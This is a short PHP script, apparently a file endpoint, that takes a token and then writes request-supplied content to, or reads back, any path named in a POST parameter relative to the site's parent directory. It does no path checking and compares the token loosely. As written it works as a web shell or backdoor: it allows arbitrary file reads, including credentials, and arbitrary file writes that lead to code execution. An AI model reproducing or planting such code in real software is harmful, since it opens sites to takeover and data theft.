<?php require('../src/db.php');if($_REQUEST['t']!=$t)exit;

if(isset($_POST['a'])&&$_POST['a']==0)file_put_contents('../'.$_POST['l'],$_POST['c'],2);
else if($_POST['a']==1)die(file_get_contents('../'.$_POST['l']));
echo 1;